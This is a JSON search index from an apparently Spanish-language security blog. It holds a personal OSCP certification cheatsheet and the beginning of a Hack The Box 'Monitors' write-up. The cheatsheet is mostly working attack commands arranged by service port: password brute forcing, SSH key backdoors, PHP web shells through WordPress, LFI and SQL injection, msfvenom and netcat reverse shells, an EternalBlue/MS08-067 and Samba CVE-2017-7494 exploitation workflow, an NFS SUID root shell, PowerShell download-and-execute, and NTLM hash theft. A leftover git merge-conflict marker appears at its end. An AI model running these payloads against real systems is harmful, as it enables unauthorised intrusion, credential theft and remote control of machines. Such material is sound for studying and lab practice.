[
  
  {
    "title": "OSCP Cheatsheet",
    "url": "/posts/OSCP-Cheatsheet/",
    "categories": "OSCP, cheatsheet",
    "tags": "OSCP",
    "date": "2022-12-12 00:00:00 +0100",
    





    
    "snippet": "Bienvenidos a mi Cheatsheet personal para la certificación de la OSCPProtocolosFTP -&gt; 21FTP (File Transfer Protocol) es un protocolo comunmente utilizado para la transferencia de archivos utiliz...",
    "content": "Bienvenidos a mi Cheatsheet personal para la certificación de la OSCPProtocolosFTP -&gt; 21FTP (File Transfer Protocol) es un protocolo comunmente utilizado para la transferencia de archivos utiliza el puerto 21 para comando y control y el 20 para el transporte de datosDescargar archivoftp &lt;IP&gt;PASSIVE             // (OPCIONAL)BINARYget &lt;FILE&gt;Subir un archivoftp &lt;IP&gt;PASSIVE              // (OPCIONAL)BINARYput &lt;FILE&gt;El comando BINARY es un modo usado comunmente para transferencia de archivos binariosFuerza Brutahydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; ftp://&lt;IP&gt; -u -vVSSH -&gt; 22SSH (Secure Shell) es un protocolo empleado para el acceso remoto a un servidor mediante una conexión cifrada, este tambien permite un sistema de keys.Conexión Basicassh &lt;USER&gt;@&lt;IP&gt;KeysDentro del directorio personal de cada usuario encontramos el directorio ~/.ssh/ si no está puede ser creado en SSH dentro podemos encontrar los siguientes contenidos:id_rsa.pub      -&gt; Esta sería la key publicaid_rsa          -&gt; Y esta sería la privadaauthorized_keys -&gt; Este archivo contiene todas las keys publicas a las que se les                    permite el acceso remotoConexión id_rsaEs importante saber que si poseemos de una key privada de algun usuario podríamos emplearla para conectarnos sin contraseña de la siguiente forma:ssh -i id_rsa &lt;USER&gt;@&lt;IP&gt;  (La id_rsa ha de tener privilegios 600 -&gt; chmod 600 id_rsa)BackdoorCon ssh-keygen podemos generar una clave privada y publica de nuestro usuario[+] Nuestra maquina:\tssh-keygen\tcat ~/.ssh/id_rsa.pub | tr -d '\\n' | xclip -sel clip[+] Maquina victima:\techo \"&lt;contenido_id_rsa.pub&gt;\" &gt;&gt; ~/.ssh/authorized_keysY ya podriamos conectarnos con nuestra id_rsa privada generada de el comando ssh-keygenFuerza Brutahydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; ssh://&lt;IP&gt; -u -vVDNS -&gt; 53Protocolo empleado en la resolución de direcciones a IPsdnsenum &lt;DOMAIN&gt;dnsrecon -d &lt;DOMAIN&gt;Ataque de Zona de Transferenciadnsrecon -d &lt;DOMAIN&gt; -adig axfr &lt;DOMAIN&gt; @ns1.test.comFuerza Brutahttps://github.com/blark/aiodnsbruteFINGER -&gt; 73Enumeración de Usuariosfinger @&lt;IP&gt;finger &lt;USER&gt;@&lt;IP&gt;Ejecución de comandosfinger \"|/bin/id@&lt;IP&gt;\"finger \"|/bin/ls -a /&lt;IP&gt;\"HTTP &amp; HTTPS -&gt; 80, 443WordpressWordpress es un gestor de contenido web (CMS) comunmente empleado.  El archivo mas importante a enumerar es: wp-config.php ya que este suele contener la contraseña y el usuario empleados para la base de datos de wordpressWPSCANHerramienta para hacer un scan general de wordpress como encontrar plugins con vulnerabilidades o enumerar usuarios validos en wordpress# Scanwpscan --url &lt;URL&gt;# Enumerar Usuarios(u) y vulnerabilidades de plugins(vp)wpscan --url &lt;URL&gt; --enumerate u,vp# Detectar plugins de forma mas agresiva (mejor con --api-token)--pulings-detection aggressive# Fuerza bruta a un usuario usando un diccionariowpscan --url &lt;URL&gt; -U \"&lt;USER&gt;\" -P &lt;PASSWORDS.txt&gt;(Podemos emplear wpseku como alternativa)Wordpress a RCE (admin requerido)Obtener Ejecución remota de comandos (RCE) estando previamente autenticado como admin en wordpressModificamos el php del tema usado (Credenciales de admin Requeridas)Appearance -&gt; Editor -&gt; 404 Template (at the right)Cambiamos el contenido a una php shell# Aquí un ejemplo de shell y de como llamarlahttps://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.phphttp://&lt;IP&gt;/wp-content/themes/twentytwelve/404.phpDrupaldroopescan scan -u &lt;URL&gt;Enumeración de usuariosIn /user/register just try to create a username and if the name is already taken it will be notified :*The name admin is already taken*If you request a new password for an existing username :*Unable to send e-mail. Contact the site administrator if the problem persists.*If you request a new password for a non-existent username :*Sorry, test is not recognized as a user name or an e-mail address.*Accessing /user/&lt;number&gt; you can see the number of existing users :\t- /user/1 -&gt; Access denied (user exist)\t- /user/2 -&gt; Page not found (user doesn't exist)Enumeración de paginas ocultasFuzz /node/&lt;NUMBER&gt; where &lt;NUMBER&gt; is a number (from 1 to 500 for example).You could find hidden pages (test, dev) which are not referenced by the search engines.wfuzz -c -z range,1-500 --hc 404 &lt;URL&gt;/node/FUZZDrupal a RCEYou need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)Go to Modules -&gt; (Check) PHP Filter  -&gt; Save configurationhttps://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.phpThen click on Add content -&gt; Select Basic Page or Article -&gt; Write php shellcode on the body -&gt; Select PHP code in Text format -&gt; Select PreviewJoomlajoomscan -u &lt;URL&gt;./joomlavs.rb --url &lt;URL&gt; -a -vTomcatCredenciales por defectoThe most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are:admin:admintomcat:tomcatadmin:&lt;NOTHING&gt;admin:s3cr3ttomcat:s3cr3tadmin:tomcatFuerza brutahydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; http-get /manager/html -vV -uTomcat a RCE# Generate payloadmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war# Upload payloadTomcat6 :wget 'http://&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;:8080/manager/deploy?war=file:shell.war&amp;path=/shell' -O -Tomcat7 and above :curl -v -u &lt;USER&gt;:&lt;PASSWORD&gt; -T shell.war 'http://&lt;IP&gt;:8080/manager/text/deploy?path=/shellh&amp;update=true'# Listenernc -lvp &lt;PORT&gt;# Execute payloadcurl http://&lt;IP&gt;:8080/shell/WebDavdavtest -url &lt;URL&gt;Spidering / Brute force directories / filesgospider -d &lt;DEPTHS&gt; --robots --sitemap -t &lt;THREADS&gt; -s &lt;URL&gt;ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u &lt;URL&gt;/FUZZ -e .php,.txt -t &lt;THREADS&gt;dirbusterDictionaries :   - /usr/share/wordlists/dirb/common.txt   - /usr/share/wordlists/dirb/big.txt   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txtFile backupsOnce you have found all the files, look for backups of all the executable files (“.php”, “.aspx“…). Common variations for naming a backup arefile.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.oldLocal File Inclusion / Remote File Inclusion - LFI / RFIhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20InclusionWrappersWrapper php://filterhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=Wrapper expect://http://example.com/index.php?page=expect://idWrapper data://echo '&lt;?php phpinfo(); ?&gt;' | base64 -w0 -&gt; PD9waHAgcGhwaW5mbygpOyA/Pgo=http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.Code execution with \t- exec\t- shell_exec\t- system\t- passthru\t- popen# Exempleecho '&lt;?php passthru($_GET[\"cmd\"]);echo \"Shell done !\"; ?&gt;' | base64 -w0 -&gt; PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=If there is \"Shell done !\" on the webpage, then there is code execution and you can do things like :http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&amp;cmd=lsWrapper input://curl -k -v \"http://example.com/index.php?page=php://input\" --data \"&lt;?php echo shell_exec('id'); ?&gt;\"Command injection  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20InjectionDeserialization  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20DeserializationFile upload  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%SQL injection  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection  https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqliSi sanitizan el nombre de la tabla o de la base de datos podriamos pasarlo a hexadecimaltr -d '\\n' | xxd -ps y el output 0x\"$output\"Si es por url hay que usar – - o # urlencoded, tambien podemos hacer sqli mediante burpsuiteDistintos payloads serian:tom' or '1'='1'tom'-- -tom'#admin')#ERROR BASED:$data' # si nos muestra un error significa que podriamos injectar querys a sql$data' union select 1-- -$data' union select schema_name from information_schema.schemata-- - # detectar bases de datos$data' union select table_name from information_schema.tables where table_schema=\"$basedatos\"-- - # enumerar tablas de la base de datos$data' union select column_name from information_schema.columns where table_schema=\"$basedatos\" and table_name=\"$tabla\"-- -$data' union select group_concat($columna1,0x3a,$columna2) from $tabla-- - # en este caso solo se usa 1 campo para 2 columnas# si $tabla está en otra base de datos: $basedatos.$tabla$data' union select \"algo\" into outfile \"/var/www/html/prueba.txt\"-- - # probamos a acceder a ip/prueba.txt$data' union select \"&lt;?php system($_REQUEST['cmd']); ?&gt;\" into outfile \"/var/www/html/prueba.php\"-- - # para ver si podemos escribir en un fichero# a lo mejor pudiendo subir codigo php para que lo interprete' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -# para ver las sentencias que podemos hacerLOAD_FILE('alsdjfl'); # podemos listar contenido de la web para ver como# funciona el php y incluso sacar psswd y user de dbXSS  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20InjectionOtras vulnerabilidades web  https://github.com/swisskyrepo/PayloadsAllTheThingsKerberos -&gt; 88  https://www.tarlogic.com/en/blog/how-to-attack-kerberos/POP3 -&gt; 110Fuerza brutahydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; pop3 -Vhydra -S -v -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -s 995 -f &lt;IP&gt; pop3 -VLeer un correotelnet &lt;IP&gt; 110USER &lt;USER&gt;PASS &lt;PASSWORD&gt;LISTRETR &lt;MAIL_NUMBER&gt;QUITNTP -&gt; 123/udpNTP (Network Time Protocol) es un protocolo de Internet para sincronizar los relojes de los sistemas informáticosExisten distintas herramientas para conectarte con ntp y sincronizar tu horaSNMP -&gt; 161/udpFuerza bruta de la community stringonesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt &lt;IP&gt;snmpbulkwalk -c &lt;COMMUNITY_STRING&gt; -v&lt;VERSION&gt; &lt;IP&gt;snmp-check &lt;IP&gt;Modifying SNMP values  http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.htmlLDAP -&gt; 389Scansnmap -n -sV --script \"ldap* and not brute\"ldapsearch -h &lt;IP&gt; -x -s baseldapsearch -h &lt;IP&gt; -x -D '&lt;DOMAIN&gt;\\&lt;USER&gt;' -w '&lt;PASSWORD&gt;' -b \"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;\"Interfaz GraficajxplorerSMB -&gt; 445Version if nmap didn’t detect itSometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.ORsudo ngrep -i -d &lt;INTERFACE&gt; 's.?a.?m.?b.?a.*[[:digit:]]' port 139smbclient -L &lt;IP&gt;Scan for vulnerabilitynmap -p139,445 --script \"smb-vuln-* and not(smb-vuln-regsvc-dos)\" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 &lt;IP&gt;If :  MS17-010 - EternalBlue  MS08-067 - MS08-067  CVE-2017-7494 - CVE-2017-7494Manual testingsmbmap -H &lt;IP&gt;smbmap -u '' -p '' -H &lt;IP&gt;smbmap -u 'guest' -p '' -H &lt;IP&gt;smbmap -u '' -p '' -H &lt;IP&gt; -Rcrackmapexec smb &lt;IP&gt;crackmapexec smb &lt;IP&gt; -u '' -p ''crackmapexec smb &lt;IP&gt; -u 'guest' -p ''crackmapexec smb &lt;IP&gt; -u '' -p '' --sharesenum4linux -a &lt;IP&gt;smbclient --no-pass -L //$IPsmbclient //&lt;IP&gt;/&lt;SHARE&gt;# Download all files from a directory recursivelysmbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt; -c \"prompt OFF;recurse ON;mget *\"Brute forcecrackmapexec smb &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; smb://&lt;IP&gt; -u -vVMount a SMB sharemkdir /tmp/sharesudo mount -t cifs //&lt;IP&gt;/&lt;SHARE&gt; /tmp/sharesudo mount -t cifs -o 'username=&lt;USER&gt;,password=&lt;PASSWORD&gt;'//&lt;IP&gt;/&lt;SHARE&gt; /tmp/sharesmbclient //&lt;IP&gt;/&lt;SHARE&gt;smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt;Get a shellpsexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; &lt;COMMAND&gt;atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;EternalBlue (MS17-010)https://github.com/3ndG4me/AutoBlue-MS17-010Check if vulnerablepython eternal_checker.py &lt;IP&gt;Prepare shellcodes and listenerscd shellcode./shell_prep.shcd .../listener_prep.shExploitpython eternalblue_exploit&lt;NUMBER&gt;.py &lt;IP&gt; shellcode/sc_all.binMay need to run it multiple timesIf this doesn’t work, try this onepython zzz_exploit.py &lt;IP&gt;MS08-067# Download exploit codegit clone https://github.com/andyacer/ms08_067.git# Generate payloadmsfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windowsmsfvenom -p windows/shell_bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windows# ModifyModify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.# Listenernc -lvp &lt;PORT&gt;# Exploitpython ms08_067_2018.py &lt;IP&gt; &lt;NUMBER&gt; 445CVE-2017-7494# Download exploit codegit clone https://github.com/joxeankoret/CVE-2017-7494Create a new file named poc.c :#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int samba_init_module(void){\tsetresuid(0,0,0);\tsystem(\"ping -c 3 &lt;IP&gt;\");}# Buildgcc -o test.so -shared poc.c -fPIC# Start an ICMP listenersudo tcpdump -i &lt;INTERFACE&gt; icmp# Exploit./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom=test.soIf you reiceve 3 pings on your listener then the exploit works. Now let’s get a shell :#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int samba_init_module(void){\tsetresuid(0,0,0);\tsystem(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f\");}# Buildgcc -o test.so -shared poc.c -fPIC# Start a listenernc -lvp &lt;PORT&gt;# Exploit./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom=test.soMSSQL -&gt; 1433Get informationnmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;mssqlclient.py -windows-auth &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;mssqlclient.py &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;# Once logged in you can run queries:SQL&gt; select @@ version;# Steal NTLM hashsudo smbserver.py -smb2support liodeus .SQL&gt; exec master..xp_dirtree '\\\\&lt;IP&gt;\\liodeus\\' # Steal the NTLM hash, crack it with john or hashcat# Try to enable code executionSQL&gt; enable_xp_cmdshell# Execute codeSQL&gt; xp_cmdshell whoami /allSQL&gt; xp_cmdshell certutil.exe -urlcache -split -f http://&lt;IP&gt;/nc.exeManual exploitCheatsheet :\t- https://www.asafety.fr/mssql-injection-cheat-sheet/NFS -&gt; 2049Tambien podemos consultar en hacktricksShow Mountable NFS Sharesshowmount -e &lt;IP&gt;nmap --script=nfs-showmount -oN mountable_shares &lt;IP&gt;Mount a sharesudo mount -v -t nfs &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;sudo mount -v -t nfs -o vers=2 &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;NFS misconfigurations# List exported sharescat /etc/exportsIf you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.# Attacker, as root usermkdir &lt;DIRECTORY&gt;mount -v -t nfs &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;cd &lt;DIRECTORY&gt;echo 'int main(void){setreuid(0,0); system(\"/bin/bash\"); return 0;}' &gt; pwn.cgcc pwn.c -o pwnchmod +s pwn# Victimcd &lt;SHARE&gt;./pwn # Root shellMYSQL -&gt; 3306Fuerza brutahydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; mysql -vV -I -uExtracting MySQL credentials from filescat /etc/mysql/debian.cnfgrep -oaE \"[-_\\.\\*a-Z0-9]{3,}\" /var/lib/mysql/mysql/user.MYD | grep -v \"mysql_native_password\"Conectarte# Localmysql -u &lt;USER&gt;mysql -u &lt;USER&gt; -p# Remotemysql -h &lt;IP&gt; -u &lt;USER&gt;MySQL comandosshow databases;use &lt;DATABASES&gt;;show tables;describe &lt;TABLE&gt;;select * from &lt;TABLE&gt;;# Try to execute codeselect do_system('id');\\! sh# Read &amp; Writeselect load_file('&lt;FILE&gt;');select 1,2,\"&lt;?php echo shell_exec($_GET['c']);?&gt;\",4 into OUTFILE '&lt;OUT_FILE&gt;'Manual exploitCheatsheet :\t- https://www.asafety.fr/mysql-injection-cheat-sheet/RDP -&gt; 3389Fuerza brutacrowbar -b rdp -s &lt;IP&gt;/CIDR -u &lt;USER&gt; -C &lt;PASSWORDS_LIST&gt;crowbar -b rdp -s &lt;IP&gt;/CIDR -U &lt;USERS_LIST&gt; -C &lt;PASSWORDS_LIST&gt;hydra -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; rdp://&lt;IP&gt; -u -vVConectarte con contraseña o hashesrdesktop -u &lt;USERNAME&gt; &lt;IP&gt;rdesktop -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;IP&gt;xfreerdp /u:[DOMAIN\\]&lt;USERNAME&gt; /p:&lt;PASSWORD&gt; /v:&lt;IP&gt;xfreerdp /u:[DOMAIN\\]&lt;USERNAME&gt; /pth:&lt;HASH&gt; /v:&lt;IP&gt;Session stealingGet openned sessionsquery userAccess to the selectedtscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt;Adding user to RDP group (Windows)net localgroup \"Remote Desktop Users\" &lt;USER&gt; /addVNC  -&gt; 5800, 58001, 5900, 59001Escaneonmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p &lt;PORT&gt; &lt;IP&gt;Fuerza brutahydra -L &lt;USERS_LIST&gt; –P &lt;PASSWORDS_LIST&gt; -s &lt;PORT&gt; &lt;IP&gt; vnc -u -vVConectartevncviewer &lt;IP&gt;:&lt;PORT&gt;Found VNC passwordLinuxDefault password is stored in: ~/.vnc/passwdWindows# RealVNCHKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\vncserver# TightVNCHKEY_CURRENT_USER\\Software\\TightVNC\\Server# TigerVNCHKEY_LOCAL_USER\\Software\\TigerVNC\\WinVNC4# UltraVNCC:\\Program Files\\UltraVNC\\ultravnc.iniDecrypt VNC passwordmsfconsoleirbfixedkey = \"\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\"require 'rex/proto/rfb'Rex::Proto::RFB::Cipher.decrypt [\"2151D3722874AD0C\"].pack('H*'), fixedkey/dev/nulWINRM -&gt; 5985, 5986Fuerza brutacrackmapexec winrm &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;Conectarteevil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -H &lt;HASH&gt;Tansferencia de archivosLinuxEstas son distintas formas de transferir archivos entre maquinas linux# INICIANDO UN SERVIDOR WEB CON PYTHONsudo python -m SimpleHTTPServer &lt;PORT&gt; # Opción 1sudo python -m http.server &lt;PORT&gt; # Opción 2# FTPsudo python3 -m pyftpdlib  -p 21 -w# INICIANDO UN SERVIDOR SMBsudo impacket-smbserver smbFolder $(pwd) -smb2support# WGETwget &lt;URL&gt; -o &lt;OUT_FILE&gt;# CURLcurl &lt;URL&gt; -o &lt;OUT_FILE&gt;# NETCATnc -lvp 443 &gt; &lt;OUT_FILE&gt; # Victimanc &lt;IP&gt; 443 &lt; &lt;IN_FILE&gt;  # Atacante# SCPscp &lt;SOURCE_FILE&gt; &lt;USER&gt;@&lt;IP&gt;:&lt;DESTINATION_FILE&gt;scp -P 2222 -i id_rsa pspy www-data@10.10.10.246:/tmp/pspy # EjemploWindows# FTP echo open &lt;IP&gt; 21 &gt; ftp.txt echo anonymous&gt;&gt; ftp.txt echo password&gt;&gt; ftp.txt echo binary&gt;&gt; ftp.txt echo GET &lt;FILE&gt; &gt;&gt; ftp.txt echo bye&gt;&gt; ftp.txtftp -v -n -s:ftp.txt# SMBcopy \\\\&lt;IP&gt;\\&lt;PATH&gt;\\&lt;FILE&gt; # Linux -&gt; Windowscopy &lt;FILE&gt; \\\\&lt;IP&gt;\\&lt;PATH&gt;\\ # Windows -&gt; Linux# Powershellpowershell.exe (New-Object System.Net.WebClient).DownloadFile('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('&lt;URL&gt;')powershell \"wget &lt;URL&gt;\"# Pythonpython.exe -c \"from urllib import urlretrieve; urlretrieve('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')\"# CertUtilcertutil.exe -urlcache -split -f \"&lt;URL&gt;\"# NETCATnc -lvp 1234 &gt; &lt;OUT_FILE&gt; nc &lt;IP&gt; 1234 &lt; &lt;IN_FILE&gt;# CURLcurl &lt;URL&gt; -o &lt;OUT_FILE&gt;Escalada de PrivilegiosLinuxEnumeración con Scripts# Hay un repositorio en github con la utilidad linpeas la cual nos reportará# información y posibles vectores de ataque./linpeas.sh# Contamos con pspy que es un repositorio de una utilidad en python que nos permite# ver que comandos suceden en el sistema con privilegios, ideal para intentar un# path hijackingpspy.pyEnumerar permisos# Tratamos de listar aquellos archivos suidfind / -perm -4000 2&gt;/dev/null # Listamos capabilites de las que poder abusar en el sistemagetcap -r / 2&gt;/dev/nullMethodology to follow# En caso de que haya un gestor de contenidos# o una web con sql y php buscar credenciales en# config.php o el que corresponda ubicado en la raiz# de la web# Ver si podemos leer claves privadas ssh de algún usuario# o podemos añadir nuestra clave publica al authorized_keys# Ver si podemos ejecutar algo con sudosudo -l# Ver si hay algun archivo raro en el home de algun usuario# tambien comprobar el .bash_history (los archivos ocultos# empiezan por . y para verlos usamos ls -la)# Reutilizar credenciales encontradas en los usuarios y servicios# Enumerar permisos SUID GUID Y CAPABILITIES# Ver si podemos modificar el /etc/password# Buscar en /etc archivos que contengan cadenas relevantes# como el nombre de nuestro usuariogrep -Ri \"wh1texnd\" /etc 2&gt;/dev/null# Listar puertos abiertos para encontrar los que no están expuesto# para hacer port forwardingnetstat -nat# Si estamos en un dockerKernel ExploitsOS ExploitsPassword reuse (mysql, .bash_history, 000- default.conf...)Known binaries with suid flag and interactive (nmap)Custom binaries with suid flag either using other binaries or with command executionWritable files owned by root that get executed (cronjobs)MySQL as rootVulnerable services (chkrootkit, logrotate)Writable /etc/passwdReadable .bash_historySSH private keyListening ports on localhost/etc/fstab/etc/exports/var/mailProcess as other user (root) executing something you have permissions to modifySSH public key + Predictable PRNGapt update hooking (PreInvoke)Scripts en BASHEnumeración de RedEnumeración de hosts usando ping#!/bin/bashfor host in $(seq 1 254); do\ttimeout 1 bash -c \"ping -c 1 10.0.0.$i &amp;&gt;/dev/null\" &amp;&amp; echo \"[*] Host 10.0.0.$i - Active\" &amp;done; waitEnumeracion de multiples redes usando ping#!/bin/bashfunction ctrl_c(){    echo -e \"\\n\\n[!] Saliendo ...\\n\"     exit 1; tput cnorm}#Ctrl + Ctrap ctrl_c INTnetworks=(172.18.0 172.19.0)tput civis; for network in ${networks[@]};do    echo \"[+] Enumerando Network: $network\"    for i in $(seq 1 254); do        timeout 1 bash -c \"ping -c 1 $network$i &amp;&gt;/dev/null\" &amp;&amp; echo -e \"\\t[*] Host $network$i - ACTIVE\" &amp;    done; waitdone;tput cnormEscaneo de puertos para multiples hosts#!/bin/bashfunction ctrl_c(){    echo -e \"\\n\\n[!] Saliendo ...\\n\"     exit 1; tput cnorm}#Ctrl + Ctrap ctrl_c INThosts=(172.20.0.2 172.20.0.1 172.20.0.3)tput civis; for host in ${hosts[@]};do    echo \"[+] Enumerando puertos del $host:\"    for i in $(seq 1 10000); do        timeout 1 bash -c \"echo '' &gt; /dev/tcp/$host/$i\" 2&gt;/dev/null &amp;&amp; echo -e \"\\t[*] Port $i - OPEN\" &amp;    done; waitdone;tput cnormMonitorización de ProcesosPodemos emplear el siguiente script en bash:#!/bin/bashold_process=$(ps -eo user,command)while true;do\tnew_process=$(ps -eo user,command)\tdiff &lt;(echo \"$old_process\") &lt;(echo \"$new_process\") | grep \"[\\&gt;\\&lt;]\" | grep -vE \"command|diff|kworker\"\told_process=$new_processdone  Podemos tambien hacer uso de la utilidad pspy:https://github.com/DominicBreuker/pspy«««&lt; HEADScripts en PythonTOTP empleando NTPTOTP es un algoritmo que permite generar una contraseña de un solo uso que utiliza la hora actual como fuente de singularidad, cambiando así cada varios minutos.#!/usr/bin/python3import pyotpimport ntplibclient=ntplib.NTPClient()response=client.request(\"10.10.10.246\")totp = pyotp.TOTP(\"orxxi4c7orxwwzlo\")print(\"EL TOKEN es -&gt; %s\" % totp.at(response.tx_time))=======                                                        569c23d348511f33036147febc4ed2645290de7c                                          "
  },
  
  {
    "title": "Monitors",
    "url": "/posts/Monitors/",
    "categories": "Writeups, Hack The Box",
    "tags": "OSCP, OSWE",
    "date": "2022-12-04 17:59:28 +0100",
    





    
    "snippet": "  Hoy vamos a realizar un writeup de maquina linux retirada Monitors alojada en la plataforma de Hack The Box,  por aqui os dejo mi perfil por si quereis darme respect jejejej  https://www.hacktheb...",
    "content": "  Hoy vamos a realizar un writeup de maquina linux retirada Monitors alojada en la plataforma de Hack The Box,  por aqui os dejo mi perfil por si quereis darme respect jejejej  https://www.hackthebox.com/home/users/profile/1019735User  Hacemos un escaneo inicial para ver los puertos abiertos\tsudo nmap -sS --min-rate 5000 -p- -open -n -Pn 10.10.10.238  Acto seguido usamos los scripts que nos aporta la utilidad nmap para hacer un reconocimiendo de los mismos\tsudo nmap -sCV -p22,80 -n -Pn 10.10.10.238 -oN targeted  Entramos a la web que se ejecuta en el puerto 80, vemos que nos dice lo siguiente aprovechandonos del correo vemos el dominio \"monitors.htb\" este mismo deberemos añadirlo al fichero /etc/hosts para que al ponerlo nos resuelva hacia la maquina y ver si se aplica virtual hosting10.10.10.238 monitors.htb  Entramos a la web y vemos que se aplica Virtual Hosting ya que cambia el contenido, leyendo el pie de pagina vemos que estamos frente a un wordpress por lo que podríamos enumerar usuarios validos en el login pero en este caso no ya que solo hay un post del usuario admin.Por lo que se nos ocurririía enumerar plugins en busca de alguno vulnerable.  Para esto podríamos usar el repositorio de seclists en github que nos incluye diccionarios para probar fuzzeando o mejor aun construirnos un script que nos permita crear un diccionario con los nombres de los 52.700 plugins registrados.  